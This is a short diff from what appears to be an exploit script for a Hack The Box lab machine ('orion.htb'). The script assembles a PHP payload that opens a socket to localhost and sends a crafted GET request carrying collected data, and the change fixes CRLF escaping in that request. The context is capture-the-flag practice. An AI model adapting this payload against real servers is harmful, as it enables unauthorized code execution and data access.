@@ -31,7 +31,7 @@ php1 = '<?php ' \
     '# Send via raw socket to localhost ' \
     '$sock = @fsockopen("127.0.0.1", 80, $eno, $err, 5); ' \
     'if ($sock) { ' \
-    '  $req = "GET /index.php?$data HTTP/1.0\\r\\nHost: orion.htb\\r\\nConnection: close\\r\\n\\r\\n"; ' \
+    '  $req = "GET /index.php?$data HTTP/1.0\r\nHost: orion.htb\r\nConnection: close\r\n\r\n"; ' \
     '  fwrite($sock, $req); ' \
     '  $resp = stream_get_contents($sock); ' \
     '  fclose($sock); ' \
